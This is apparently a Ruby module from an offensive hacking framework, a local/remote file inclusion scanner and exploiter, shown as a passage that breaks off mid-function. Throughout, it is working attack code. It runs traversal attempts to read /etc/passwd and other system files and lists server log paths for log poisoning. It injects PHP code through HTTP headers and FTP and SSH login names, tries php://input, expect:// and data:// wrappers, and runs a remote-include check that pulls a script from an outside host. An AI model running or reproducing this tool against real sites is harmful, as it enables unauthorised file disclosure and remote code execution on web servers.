# Simple Local/Remote File Include Scanner

class FileIncluder < Core::CoreShell
	def initialize
		#Basic Info:
		module_name='LFI_Discovery_Scan'
		module_info={
			'Name'        => 'LFI Discovery Scan',
			'Version'     => 'v0.01b',
			'Description' => "Local/Remote File Include Discovery Scanner\n\tTarget => Target host to Scan for File Inclusion Vulnerability\n\t\tShould include '[LFI]' marker in injection position\n\tMin => The minimum number of directories to traverse\n\tMax => Maximum number of directories to traverse\n\tStep => Step Method to use for Traversals:\n\t\t0 => \"../\" (Default)\n\t\t1 => \"..%2f\"\n\t\t2 => \"..%25%5c\"\n\t\t3 => \"..%5c\"\n\t\t4 => \"..%bg%qf\"\n\tPost => Data for POST requests\n\t\tShould include '[LFI]' marker in injection position if not present in main link\n\tCookie => Cookie Data Required for Injection\n\tAuth => Enable HTTP Basic Auth for Injection (CANT be used with proxy auth, sorry)\n\tProxyIp => Proxy IP Address\n\tProxyPort => Proxy Port\n\tUsername/Password => To be used for Basic Auth or Proxy Auth ",
			'Author'      => 'Hood3dRob1n'
		}

		module_required={ 'Target' => "http://site.com/vuln.php?par=foo&vuln=[LFI]&par=bar", 'Min' => "0", 'Max' => '7', 'Step' => '0', 'NullByte' => 'False' } 
		module_optional={ 'Post' => 'nil', 'ProxyIp' => 'nil', 'ProxyPort' => 'nil', 'Username' => 'nil', 'Password' => 'nil', 'Auth' => 0, 'Cookie' => 'nil' } #Hash of "Optional" Options

		@non_set_private_options='' #Don't Need for this

		if $module_name.nil?
			pluginRegistrar(module_name,module_info,module_required,module_optional)
		else
			if not $module_required['Target'] =~ /\[LFI\]/i and not $module_optional['Post'] =~ /\[LFI\]/i
				puts "[".light_red + "X".white + "] Missing '[LFI]' Marker from provided target link".light_red + "!".white
			else
				includer_real_initialize
			end
		end
	end

	def includer_real_initialize
		#Initialize our Http::EasyCurb request object with any special values needed, otherwise mark them to nil....
		@http = Http::EasyCurb.new($module_optional['Cookie'],$module_optional['Auth'],$module_optional['ProxyIp'],$module_optional['ProxyPort'],$module_optional['Username'],$module_optional['Password'])
		$nullbyte="%00"
		$rfi="http://inf0rm3r.webuda.com/scripts/RFI.txt%3f"

		basecheck
	end

	def basecheck
		puts "[".light_green + "*".white + "] Testting if Server is up".light_green + "......".white
		funk = $module_required['Target'].to_s.sub("[LFI]", "xxx") #clean link for parsing to test if server is up
		baseurl = URI.parse("#{funk}")
		url = "http://#{baseurl.host}/"
		rez = @http._get(url)
		if rez[1] == 200 or rez[1] == 301 or rez[1] == 302
			puts "[".light_green + "*".white + "] Confirmed Site is up, checking injection vector now".light_green + ".....".white
			#Find Server Type Using 'Server' Header Field in Server Response
			if rez[3] =~ /server: (.+)/i
				orez = $1
			end
			if not orez.nil?
				if orez =~ /IIS/ or orez =~ /Windows/i or orez =~ /Win32/i or orez =~ /Win64/i
					puts "[".light_green + "*".white + "] Windows Server".light_green + ": #{orez}".white
					@os=0 #0=Winblows, 1=*nix
				elsif orez =~ /Apache\/|CentOS|Red Hat|Debian|Fedora|Linux\/SuSE/i
					puts "[".light_green + "*".white + "] Unix Server".light_green + ": #{orez}".white
					@os=1 #0=Winblows, 1=*nix
				else
					puts "[".light_green + "*".white + "] Unknown Server".light_green + ": #{orez}".white
					@os=1 #0=Winblows, 1=*nix
				end
			else
					@os=1 #Assume its linux based and hope for best....
			end
			basefilecheck
			if @found.to_i == 2
				puts "[".light_red + "X".white + "] Unable to find working base LFI".light_red + "!".white
				puts
				puts "[".light_yellow + "X".white + "] Do you want to continue with further exploitation attempts trying to use PHP wrappers".light_yellow + "?".white + "(".light_yellow + "Y".white + "/".light_yellow + "N".white + ")".light_yellow
				answer = gets.chomp
				puts
				if "#{answer.upcase}" == "NO" or "#{answer.upcase}" == "N"
					puts "[".light_red + "X".white + "] OK".light_red + ",".white + " returning to Main Menu".light_red + ".....".white
				else
					cls
					lfi_wrapper_menu
				end
			else
				puts "[".light_green + "*".white + "] Do you want to continue with further exploitation attempts".light_green + "?".white + "(".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
				answer = gets.chomp
				puts
				if "#{answer.upcase}" == "NO" or "#{answer.upcase}" == "N"
					puts "[".light_red + "X".white + "] OK".light_red + ",".white + " returning to Main Menu".light_red + ".....".white
				else
					cls
					lfi_main_menu
				end
			end
		else
			puts "[".light_red + "X".white + "] Server doesn't appear to be up".light_red + "!".white
		end
	end

	def basefilecheck
		puts "[".light_green + "*".white + "] Running Base File Check now".light_green + "...".white
		if @os.to_i == 0
			filez = [ "c:\\windows\\win.ini", "c:\\boot.ini" ]
		else
			filez = [ "etc/passwd", "proc/self/status", "etc/./passwd", "proc/self/./status", "etc/security/passwd" ]
		end

		@found=0
		while @found.to_i < 1
			filez.each do |file|
				if $module_required['Min'].to_i == 0
					if @os.to_i == 0
						replacement = "#{file}"
					else
						replacement = "/#{file}"
					end
					basicregex(replacement, 69)
				end
				if @found.to_i == 1
					break
				end
				#Use traversal method as required....
				count = $module_required['Min'].to_i + 1 #people wont think of 0 index so lets keep it easy for them ;)
				while count.to_i <= $module_required['Max'].to_i
					stepstone = jumpz(count.to_i)
					replacement = "#{stepstone}#{file}"
					basicregex(replacement, 69)
					if @found.to_i == 1
						@stepstone = stepstone
						break
					end
					count = count.to_i + 1
				end
				if @found.to_i == 1
					break
				end
			end
			break
		end
	end

	def lfi_wrapper_menu
		#Route here if didnt find basefile successfully but still want to try a few wrapper attacks.....
		puts "[".light_green + "*".white + "] Please enter the number for the option you want to run".light_green + ": ".white
		puts "0)".white + "   Get Me Out of Here".light_green + "!".white
		puts "1)".white + "   Check ".light_green + "php://input".white #accepts RAW POST data as argument, allows exec with include when enabled
		puts "2)".white + "   Check ".light_green + "php://filters".white #Source Disclosure through base64 decoding of stream data (files from LFI)
		puts "3)".white + "   Check ".light_green + "expect://".white #PHP 4.3.0 and up (PECL) Note: This wrapper is not enabled by default, exec via PTY
		puts "4)".white + "   Check ".light_green + "data://".white #RCE via data:// wrapper (PHP 5.2+)
		case gets.chomp
			when "0"
				puts "[".light_red + "X".white + "] OK".light_red + ",".white + " returning to Main Menu".light_red + ".....\n".white
			when "1"
				puts
				input
				puts
				lfi_wrapper_menu
			when "2"
				puts
				filters(2)
				puts
				lfi_wrapper_menu
			when "3"
				puts
				expectz
				puts
				lfi_wrapper_menu
			when "4"
				puts
				datawrapper
				puts
				lfi_wrapper_menu
			else
				cls
				puts
				puts "[".light_red + "X".white + "] Oops, Didn't quite understand that last one".light_red + "!".white
				puts "[".light_yellow + "X".white + "] Please Choose a Numbered Option From Below".light_yellow + ":".white
				puts
				lfi_wrapper_menu
			end
	end

	def lfi_main_menu
		puts "[".light_green + "*".white + "] Please enter the number for the option you want to run".light_green + ": ".white
		puts "0)".white + "   Get Me Out of Here".light_green + "!".white
		puts "1)".white + "   Check ".light_green + "/proc/self/environ".white #/proc environment, reflects http request env allowing exec with LFI
		puts "2)".white + "   Check ".light_green + "/proc/self/fd/".white #File Descriptor Links to Log Files for Log Poisoning Attacks
		puts "3)".white + "   Check ".light_green + "Log Files".white #Common Logs for Log Poisoning Attacks
		puts "4)".white + "   Check ".light_green + "php://input".white #accepts RAW POST data as argument, allows exec with include when enabled
		puts "5)".white + "   Check ".light_green + "php://filters".white #Source Disclosure through base64 decoding of stream data (files from LFI)
		puts "6)".white + "   Check ".light_green + "expect://".white #PHP 4.3.0 and up (PECL) Note: This wrapper is not enabled by default, exec via PTY
		puts "7)".white + "   Check ".light_green + "data://".white #RCE via data:// wrapper (PHP 5.2+)
		puts "8)".white + "   Check ".light_green + "RFI".white #Check for RFI RCE Vulnerability
		case gets.chomp
			when "0"
				puts "[".light_red + "X".white + "] OK".light_red + ",".white + " returning to Main Menu".light_red + ".....\n".white
			when "1"
				puts
				environ
				puts
				lfi_main_menu
			when "2"
				puts
				fdlinkz
				puts
				lfi_main_menu
			when "3"
				puts
				logz
				puts
				lfi_main_menu
			when "4"
				puts
				input
				puts
				lfi_main_menu
			when "5"
				puts
				filters(1)
				puts
				lfi_main_menu
			when "6"
				puts
				expectz
				puts
				lfi_main_menu
			when "7"
				puts
				datawrapper
				puts
				lfi_main_menu
			when "8"
				puts
				rfi
				puts
				lfi_main_menu
			else
				cls
				puts
				puts "[".light_red + "X".white + "] Oops, Didn't quite understand that last one".light_red + "!".white
				puts "[".light_yellow + "X".white + "] Please Choose a Numbered Option From Below".light_yellow + ":".white
				puts
				lfi_main_menu
			end
	end

	def basicregex(replacement, type)
	#Replacement injection string, and type of request/injection to make (1=UA, 2=Accept, 3=referrer, anything else = normal request))
		if not $module_required['NullByte'].downcase == 'false'
			if $module_optional['Post'] =~ /\[LFI\]/
				funk = $module_optional['Post'].sub("[LFI]", "#{replacement}#{$nullbyte}").chomp
			else
				funk = $module_required['Target'].sub("[LFI]", "#{replacement}#{$nullbyte}").chomp
			end
		else
			if $module_optional['Post'] =~ /\[LFI\]/
				funk = $module_optional['Post'].sub("[LFI]", "#{replacement}").chomp
			else
				funk = $module_required['Target'].sub("[LFI]", "#{replacement}").chomp
			end
		end

		if $module_optional['Post'] == 'nil'
			puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{funk}".white
		else
			puts "[".light_yellow + "*".white + "] Testing".light_yellow + ": #{$module_required['Target']}".white
			puts "[".light_yellow + "*".white + "] Post data: ".light_yellow + "#{funk}".white
		end

		if $module_optional['Post'] == 'nil'
			url = URI.encode(funk)
		else
			url = URI.encode($module_required['Target'])
		end
		#Build a chambered decision driven request builder so we can keep it open to options :)
		c = Curl::Easy.new(url) do |curl|
			curl.useragent = 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)'
			if not $module_optional['ProxyIp'] == 'nil'
				if $module_optional['Auth'].to_i == 1
					#NO PASS CAN BE USED B/C basic_auth in use!
					curl.proxy_url = $module_optional['ProxyIp']
					curl.proxy_port = $module_optional['ProxyPort'].to_i
				else
					#CAN USE AUTH HERE
					if $module_optional['Username'] == 'nil'
						curl.proxy_url = $module_optional['ProxyIp']
						curl.proxy_port = $module_optional['ProxyPort'].to_i
					else
						curl.proxy_url = $module_optional['ProxyIp']
						curl.proxy_port = $module_optional['ProxyPort'].to_i
						curl.proxypwd = "#{$module_optional['Username']}:#{$module_optional['Password']}"
					end
				end
			end
			curl.cookies = $module_optional['Cookie'] unless $module_optional['Cookie'] == 'nil'
			if $module_optional['Auth'].to_i == 1
				curl.http_auth_types = :basic
				curl.username = $module_optional['Username']
				curl.password = $module_optional['Password']
			end

			#Request & Payload variances here:
			if type.to_i == 1
				curl.headers["User-Agent"]="#{@uapayload}"
			else
				curl.headers["User-Agent"]='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1'
			end
			if type.to_i == 2
				curl.headers["Accept"]="#{@accpayload}"
			end
			if type.to_i == 3
				curl.headers["Referer"]="#{@refpayload}"
			end

			#IF POST then make request, else we will use .perform in a sec for GET.....
			begin
				curl.http_post($module_required['Target'], funk) if not $module_optional['Post'] == 'nil'
			rescue Curl::Err::ConnectionFailedError
				puts "Problem with Connection".light_red + "!".white
				puts "Double check network or proxy options set & try again".light_red + "....".white
				puts
			end
		end
		foo=[]
		c.on_header do |x|
			foo << x# Collect our headers to enumerate if we need later
			x.size #keep curl from freaking out
		end
		if $module_optional['Post'] == 'nil'
			begin
				c.perform #GET
			rescue Curl::Err::ConnectionFailedError
				puts "Problem with Connection".light_red + "!".white
				puts "Double check network or options set & try again".light_red + "....".white
				puts
			end
		end
		#Regex for C:\WINDOWS\win.ini file :)
		if c.body_str =~ /(\d+\W\w+\s+\w+\s+\w+\s+\W\w+\W\s+\W\w+\W\s+\W\w+\s\w+\W\s+\W\w+\W\s+\W\w+\W\s+\w+\W\d+)/
			win = $1
			puts "[".light_green + "*".white + "] File Found: ".light_green + "C:\\WINDOWS\\win.ini".white
			puts "#{win}".white
			puts
			@found = 1
		end

		#Regex for /etc/passwd file
		if c.body_str =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/m
			puts "[".light_green + "*".white + "] File Found: ".light_green + "/etc/passwd".white
			passwdz = $1
			puts "#{passwdz}".white
			puts
			@found = 1
		end

		#Regex for /proc/self/status file
		if c.body_str =~ /^Pid:\s+\d+/ and c.body_str =~ /Uid:\s+\d+/ and c.body_str =~ /Gid:\s+\d+/ and c.body_str =~ /FDSize:\s+\d+/
			puts "[".light_green + "*".white + "] File Found: ".light_green + "/proc/self/status".white
			if c.body_str =~ /Uid:\s+(\d+)/
				@uid = $1
				puts "[".light_green + "*".white + "] Uid: ".light_green + "#{@uid}".white
			end
			if c.body_str =~ /Gid:\s+(\d+)/
				@gid = $1
				puts "[".light_green + "*".white + "] Gid: ".light_green + "#{@gid}".white
			end
			if c.body_str =~ /^Pid:\s+(\d+)/
				@pid = $1
				puts "[".light_green + "*".white + "] Pid: ".light_green + "#{@pid}".white
			end
			if c.body_str =~ /FDSize:\s+(\d+)/
				@fdsize = $1
				puts "[".light_green + "*".white + "] FDSize: ".light_green + "#{@fdsize}\n".white
			end
			@found = 1
		end

		if c.body_str =~ /HTTP_USER_AGENT=/ or c.body_str =~ /HTTP_ACCEPT=/ or c.body_str =~ /DOCUMENT_ROOT=/ or c.body_str =~ /VHOST_ROOT=/ or c.body_str =~ /HTTP_HOST/
			#Successful injection will match our regex, failure won't (concat on exec proves its working)
			if c.body_str =~ /:#{@rnd}:(.+):#{@rnd}:/ 
				@envirores = $1 #make results available
			else
				@envirores = 'fail' #make results available
			end
		end

		if type.to_i > 4
			if (c.body_str =~ /(\[error\])/ or c.body_str =~ /(User-Agent)/ or c.body_str =~ /(Mozilla)/ or c.body_str =~ /(\[client)/ or c.body_str =~ /(referer)/ or c.body_str =~ /(HTTP\/)/ or c.body_str =~ /(\[Sun)/ or c.body_str =~ /(\[Mon)/ or c.body_str =~ /(\[Tue)/ or c.body_str =~ /(\[Wed)/ or c.body_str =~ /(\[Thu)/ or c.body_str =~ /(\[Fri)/ or c.body_str =~ /(\[Sat)/ or c.body_str =~ /(GET)/ or c.body_str =~ /(POST)/ or c.body_str =~ /pam_unix(sshd:auth): authentication failure/ or c.body_str =~ /(Failed password for \w+) from \d+.\d+.\d+.\d+/ or c.body_str =~ /(Failed password for invalid user \w+) from \d+.\d+.\d+.\d+/ or c.body_str =~ /error: (PAM: authentication error for \w+) from \d+.\d+.\d+.\d+/)
				regmatch = $1
				if c.body_str =~ /User-Agent/i or c.body_str =~ /Mozilla/i
					@ua = 1
				else
					@ua = 0
				end
				if c.body_str =~ /referer/i
					@ref = 1
				else
					@ref = 0
				end
				if c.body_str =~ /pam_unix(sshd:auth): authentication failure/ or c.body_str =~ /(Failed password for \w+) from \d+.\d+.\d+.\d+/ or c.body_str =~ /(Failed password for invalid user \w+) from \d+.\d+.\d+.\d+/ or c.body_str =~ /error: (PAM: authentication error for \w+) from \d+.\d+.\d+.\d+/
					@loginlogz = 1
				else
					@loginlogz = 0
				end
				puts "[".light_green + "*".white + "] Regex Match: ".light_green + "#{regmatch}".white
				puts "[".light_green + "*".white + "] Possible User-Agent String Found in Response: ".light_green + "!".white if @ua.to_i == 1
				puts "[".light_green + "*".white + "] Possible Referer String Found in Response: ".light_green + "!".white if @ref.to_i == 1
				puts "[".light_green + "*".white + "] Possible Failed FTP or SSH Authentication Login Attempts Found in Response: ".light_green + "!".white if @loginlogz.to_i == 1
				puts "[".light_yellow + "*".white + "] Do you want to Display Page Response to confirm".light_yellow + "?".white + " (".light_yellow + "Y".white + "/".light_yellow + "N".white + ")".light_yellow
				answer = gets.chomp
				if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
					puts "[".light_green + "*".white + "] OK, here is the page response received".light_green + ":".white
					puts "#{c.body_str}".cyan
					puts
					puts "[".light_yellow + "*".white + "] Please confirm".light_yellow + ":".white
					puts "[".light_yellow + "*".white + "] Is this a Log File".light_yellow + "?".white + " (".light_yellow + "Y".white + "/".light_yellow + "N".white + ")".light_yellow
					answer = gets.chomp
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						@log = 1
					else
						@log = 0
					end
				else #we just assume it is if they dont want to review and regex has hit
					@log = 1
				end
				###################################################
				# IF @@found == 1, Ask How and Then Try to Inject #
				if @log.to_i == 1
					@fdlink = @x.to_i
					logprep_menu
				else
					puts "[".light_red + "X".white + "] OK, moving on then".light_red + ".....".white
				end
				###################################################
			end
		end

		return c.body_str
	end

	def jumpz(num) 
		if $module_required['Step'].to_i == 1
			"..%2f" * num
		elsif $module_required['Step'].to_i == 2
			"..%25%5c" * num
		elsif $module_required['Step'].to_i == 3
			"..%5c" * num
		elsif $module_required['Step'].to_i == 4
			"..%bg%qf" * num
		else
			"../" * num
		end
	end


	#Support menu for /rpoc/self/environ attack options
	def envirosupport
		puts "[".light_green + "*".white + "] Please enter the number for the option you want to try and run".light_green + ": ".white
		puts "0)".white + "   Return to Previous Menu".light_green + "!".white
		puts "1)".white + "   User-Agent Based Injection".light_green
		puts "2)".white + "   Accept Header Based Injection".light_green
		case gets.chomp
			when "0"
				puts "[".light_red + "X".white + "] OK, Returning to Previous Menu".light_blue + "....".white
				puts
			when "1"
				puts "[".light_green + "*".white + "] Testing User-Agent Based Injection".light_green + "......".white
				@rnd = randz(5)
				@uapayload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
				basicregex(@thegoods, 1)

				if not @envirores == 'fail'
					puts "[".light_green + "*".white + "] Injection Test Successful".light_green + "!".white
					puts "[".light_green + "*".white + "] ".light_green + "#{@envirores}".white
				else
					puts "[".light_red + "X".white + "] User-Agent Header Based Injection Test Doesn't appear to be working".light_red + "!".white
					puts "[".light_red + "X".white + "] Check manually to confirm 100%, sorry".light_red + ".....".white
					puts
					envirosupport
				end
				puts
			when "2"
				puts "[".light_green + "*".white + "] Testing Accept Header Based Injection".light_blue + "......".white
				@rnd = randz(5)
				@accpayload = "<?error_reporting(0);echo \":\".\"#{@rnd}:\".\"working...check,check,1,2,3\".\":#{@rnd}:\";?>"
				body = basicregex(@thegoods, 2)

				if not @@envirores == 'fail'
					puts "[".light_green + "*".white + "] Injection Test Successful".light_green + "!".white
					puts "[".light_green + "*".white + "] ".light_green + "#{@envirores}".white
				else
					puts "[".light_red + "X".white + "] User-Agent Header Based Injection Test Doesn't appear to be working".light_red + "!".white
					puts "[".light_red + "X".white + "] Check manually to confirm 100%, sorry".light_red + ".....".white
					puts
					envirosupport
				end
			else
				cls
				puts
				puts "Oops, Didn't quite understand that one".light_red + "!".white
				puts "Please Choose a Numbered Option From Below".light_red + ":".white
				puts
				envirosupport
			end
	end

	# Base for /proc/self/environ attack process
	def environ
		if @os.to_i == 0
			puts "[".light_red + "X".white + "] Your target appears to be Winblows".light_red + "!".white
			puts "[".light_red + "X".white + "] This option is only available for *nix machines".light_red + "!".white
		else
			puts "[".light_green + "*".white + "] Testing for ".light_green + "/proc/self/environ".white + " RCE Vuln".light_green + ".....".white

			filez = [ "proc/self/./environ", "proc/self/environ" ]

			@ua=0
			@found=0
			@accept=0
			while @found.to_i < 1
				filez.each do |file|
					if $module_required['Min'].to_i == 0
						@thegoods="/#{file}"
					else
						@thegoods="#{@stepstone}#{file}"
					end
					body = basicregex(@thegoods, 69)
					#Regex for /proc/self/environ file
					if body =~ /HTTP_USER_AGENT=/ or body =~ /HTTP_ACCEPT=/ or body =~ /DOCUMENT_ROOT=/ or body =~ /VHOST_ROOT=/ or body =~ /HTTP_HOST/
						@environ = 'true'
						if body =~ /HTTP_USER_AGENT=/
							@ua = 1
						end
						if body =~ /HTTP_ACCEPT=/
							@accept = 1
						end
						#Successful injection will match our regex, failure won't (concat on exec proves its working)
						if body =~ /:#{@rnd}:(.+):#{@rnd}:/ 
							@envirores = $1 #make results available
						end
						@found = 1
						break
					else
						@environ = 'false'
					end
				end
				if @found.to_i == 0
					@found = 2 #break cause we are out of file options to test, will use value to offset from true success...
				end
			end

			if @environ == 'true'
				puts "[".light_green + "*".white + "] File Found: ".light_green + "/proc/self/environ".white
				puts "[".light_green + "*".white + "] User-Agent is present in response".light_green + "!".white if @ua.to_i == 1
				puts "[".light_green + "*".white + "] Accept Header is present in response".light_green + "!".white if @accept.to_i == 1
				envirosupport
			else
				puts "[".light_red + "X".white + "] Sorry, ".light_red + "/proc/self/environ".white + " doesn't appear to be available".light_red + ".....".white
				puts "[".light_red + "X".white + "] Returning to Previous Menu".light_red + "...".white
			end
		end
	end

	def logz
		if @os.to_i == 0
			logfilez = [ "c:\\Program Files\\Apache Group\\Apache\\logs\\access.log", "c:\\Program Files\\Apache Group\\Apache\\logs\\access_log", "c:\\Program Files\\Apache Group\\Apache\\logs\\error.log", "c:\\Program Files\\Apache Group\\Apache\\logs\\error_log", "c:\\Program Files\\xampp\apache\\logs\\access_log", "c:\\Program Files\\xampp\apache\\logs\\access.log", "c:\\Program Files\\xampp\apache\\logs\\error_log", "c:\\Program Files\\xampp\apache\\logs\\error.log", "c:\\logs\\access.log", "c:\\logs\\access_log", "c:\\logs\\error.log", "c:\\logs\\error_log", "c:\\apache\\logs\\access.log", "c:\\apache\\logs\\access_log", "c:\\apache\\logs\\error.log", "c:\\apache\\logs\\error_log", "c:\\apache2\\logs\\access.log", "c:\\apache2\\logs\\access_log", "c:\\apache2\\logs\\error.log", "c:\\apache2\\logs\\error_log", "c:\\xampp\\apache\\logs\\error.log", "c:\\xampp\\apache\\logs\\access.log", "c:\\xampp\\FileZillaFTP\\Logs\\error.log", "c:\\xampp\\FileZillaFTP\\Logs\\access.log", "c:\\xampp\\MercuryMail\\LOGS\\error.log", "c:\\xampp\\MercuryMail\\LOGS\\access.log", "c:\\log\\httpd\\access_log", "c:\\log\\httpd\\error_log", "c:\\logs\\httpd\\access_log", "c:\\logs\\httpd\\error_log" ]
		else
			logfilez = [ "etc/apache/logs/error.log", "etc/apache/logs/access.log", "etc/apache2/logs/error.log", "etc/apache2/logs/access.log", "etc/apache/logs/error_log", "etc/apache/logs/access_log", "etc/apache2/logs/error_log", "etc/apache2/logs/access_log", "etc/httpd/logs/acces_log", "etc/httpd/logs/acces.log", "etc/httpd/logs/error_log", "etc/httpd/logs/error.log", "var/www/logs/access_log", "var/www/logs/access.log", "usr/local/apache/logs/access_log", "usr/local/apache/logs/access.log", "var/log/apache/access_log", "var/www/log/access_log", "var/www/log/access.log", "var/www/log/error_log", "var/www/log/error.log", "usr/local/apache2/logs/access_log", "usr/local/apache2/logs/access.log", "usr/local/apache2/logs/error_log", "usr/local/apache2/logs/error.log", "var/log/apache2/access_log", "var/log/apache/access.log", "var/log/apache2/access.log", "var/log/access_log", "var/log/access.log", "var/www/logs/error_log", "var/www/logs/error.log", "usr/local/apache/logs/error_log", "usr/local/apache/logs/error.log", "var/log/apache/error_log", "var/log/apache2/error_log", "var/log/apache/error.log", "var/log/apache2/error.log", "var/log/error_log", "var/log/error.log", "var/log/httpd/access.log", "var/log/httpd/access_log", "var/log/httpd/error.log", "var/log/httpd/error_log", "opt/lampp/logs/access_log", "opt/lampp/logs/access.log", "opt/lampp/logs/error_log", "opt/lampp/logs/error.log", "opt/xampp/logs/access_log", "opt/xampp/logs/access.log", "opt/xampp/logs/error_log", "opt/xampp/logs/error.log", "var/log/ftp.log", "var/log/proftpd/auth.log", "var/log/proftpd/proftpd.log", "var/log/auth.log", "var/log/ssh/auth.log", "var/log/secure" ]
		end
		puts "[".light_green + "*".white + "] Testing for Common ".light_green + "Log Files".white + " for RCE via Log Poisoning".light_green + ".....".white

		logfilez.each do|x|
			if $module_required['Min'].to_i == 0
				@thegoods="/#{x}"
			else
				@thegoods="#{@stepstone}#{x}"
			end
			basicregex(@thegoods, 69)
		end
	end

	def ftpinject
		puts
		puts "[".light_green + "*".white + "] Please enter the number for the FTP Injection option you want to try".light_green + ": ".white
		puts "1)".white + "   Return to Previous Menu".light_blue
		puts "2)".white + "   Run FTP Login Based Injection against current site".light_blue
		puts "NOTE".light_yellow + ":".white + " FTP Login Injection Option does NOT have proxy support at this time".light_red + "!".white
		case gets.chomp
			when "1"
				puts "[".light_red + "X".white + "] OK, Returning to Previous Menu".light_blue + "....".white
				puts
			when "2"
				baseurl = URI(URI.encode($module_required['Target']))
				begin
					ftpz = Net::FTP.new("#{baseurl.host}") #ftp object to target
					ftpz.login("#{@ftppayload}", 'fooFucked') #inject via username field as it shows in most ftp log files
					ftpz.close #close connect as we dont care or need anything
				rescue
					puts "[".light_red + "X".white + "] Error Triggered, hope it works".light_red + "!".white
				end
			else
				cls
				puts
				puts "Oops, Didn't quite understand that one".light_red + "!".white
				puts "Please Choose a Numbered Option From Below".light_red + ":".white
				puts
				ftpinject
			end
	end

	def sshinject
		puts
		puts "[".light_green + "*".white + "] Please enter the number for the SSH Injection option you want to try".light_green + ": ".white
		puts "1)".white + "   Return to Previous Menu".light_blue
		puts "2)".white + "   Run SSH Login Based Injection against current site".light_blue
		puts "NOTE".light_yellow + ":".white + " SSH Login Injection Option does NOT have proxy support at this time & is experimental still".light_red + "!".white
		case gets.chomp
			when "1"
				puts "[".light_red + "X".white + "] OK, Returning to Previous Menu".light_blue + "....".white
				puts
			when "2"
				baseurl = URI(URI.encode($module_required['Target']))

				begin 
					#Trigger injection via SSH username field....
					sshi = Net::SSH.start("#{baseurl.host}", "#{@sshpayload}", :password => 'fooFucked')
					foofucked = sshi.exec!('ls') #We will never make it here :p
					sshi.close
				rescue
					puts "[".light_red + "X".white + "] Error Triggered, hope it works".light_red + "!".white
				end
			else
				cls
				puts
				puts "Oops, Didn't quite understand that one".light_red + "!".white
				puts "Please Choose a Numbered Option From Below".light_red + ":".white
				puts
				sshinject(funk)
			end
	end

	def uri_inject
		puts
		puts "[".light_green + "*".white + "] Please enter the number for the URI Injection option you want to try".light_green + ": ".white
		puts "1)".white + "   Return to Previous Menu".light_green
		puts "2)".white + "   Run Default Error Based Injection against current site".light_green
		puts "NOTE".light_yellow + ":".white + " URI Injection Option does NOT have proxy support at this time".light_red + "!".white
		case gets.chomp
			when "1"
				puts "[".light_red + "X".white + "] OK, Returning to Previous Menu".light_green + "....".white
				puts
			when "2"
				puts "[".light_green + "*".white + "] OK, Attempting to Trigger URI Error Based Injection".light_green + "....".white

				funk = $module_required['Target'].sub("[LFI]", "foobar").chomp
				baseurl = URI(URI.encode(funk)) #Encode to parse, decode path before use and all will be well ;)
				funzi = randz(15)
				foopath = "#{funzi}#{@uripayload}"
				begin
				##############For some reason all my attempts to proxy this request seem to somehow mess up the injection payload. I really am confused so if you got quick fix i am all ears..............................?
					Net::HTTP.start(baseurl.host, baseurl.port) do |http|
						request = Net::HTTP::Get.new(foopath, { 'User-Agent' => 'Jeepers-Kreepers' })
						response = http.request(request)
						puts "[".light_green + "*".white + "] CODE: ".light_green + "#{response.code}".white
					end
				rescue Timeout::Error
					puts "[".light_red + "X".white + "] Connection timeout".light_red + "!".white
				end
			else
				cls
				puts
				puts "Oops, Didn't quite understand that one".light_red + "!".white
				puts "Please Choose a Numbered Option From Below".light_red + ":".white
				puts
				uri_inject
			end
	end

	def logprep_menu
		if @found.to_i == 1
			puts "[".light_green + "*".white + "] Do you want to Try & Test for RCE via Log Poisoning".light_green + "?".white + " (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
			answer = gets.chomp
			if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
				puts "[".light_green + "*".white + "] Please enter the number for the option you want to try".light_green + ": ".white
				puts "0)".white + "   User-Agent Based Injection".light_green
				puts "1)".white + "   Referer Based Injection".light_green
				puts "2)".white + "   URI Based Injection".light_green
				puts "3)".white + "   FTP Login Based Injection".light_green
				puts "4)".white + "   SSH Login Based Injection".light_green
				puts "5)".white + "   Continue testing other links".light_green
				case gets.chomp
					when "0"
						@rnd = randz(5)
						@uapayload = "<? echo ':'.'#{@rnd}:'.'working...check,check,1,2,3'.':#{@rnd}:'; ?>"

						basicregex(@thegoods, 1)
						body = basicregex(@thegoods, 1)
						if body =~ /:#{@rnd}:(.+):#{@rnd}:/
							@success = $1 #make results available for injections using this one
						else
							@success = 'fail'
						end
						if not @success == 'fail'
							puts "[".light_green + "*".white + "] Appears to have been a successful injection".light_green + "!".white
							puts "[".light_green + "*".white + "] ".light_green + "#{@success}".white
							puts
							logprep_menu
						else
							puts "[".light_red + "X".white + "] Doesn't appear to be working".light_red + "!".white
							puts "[".light_red + "X".white + "] Always best to check manually to confirm, sorry".light_red + "....".white
							puts
							logprep_menu
						end
					when "1"
						@rnd = randz(5)
						@refpayload = "<? echo ':'.'#{@rnd}:'.'working...check,check,1,2,3'.':#{@rnd}:'; ?>"
						basicregex(@thegoods, 3)
						body = basicregex(@thegoods, 3)
						if body =~ /:#{@rnd}:(.+):#{@rnd}:/
							@success = $1 #make results available for injections using this one
						else
							@success = 'fail'
						end
						if not @success == 'fail'
							puts "[".light_green + "*".white + "] Appears to have been a successful injection".light_green + "!".white
							puts "[".light_green + "*".white + "] ".light_green + "#{@success}".white
							puts
							logprep_menu
						else
							puts "[".light_red + "X".white + "] Doesn't appear to be working".light_red + "!".white
							puts "[".light_red + "X".white + "] Always best to check manually to confirm, sorry".light_red + "....".white
							puts
							logprep_menu
						end
					when "2"
						#Method = URI Injection, meth=4
						@rnd = randz(5)
						@uripayload = "<? echo ':'.'#{@rnd}:'.'working...check,check,1,2,3'.':#{@rnd}:'; ?>"
						uri_inject #Triggers Error Injection, Now need to re-request fd link to check if it worked......
						#check fd link to see if it worked!
						body = basicregex(@thegoods, 4)
						if body =~ /:#{@rnd}:(.+):#{@rnd}:/
							@success = $1 #make results available for injections using this one
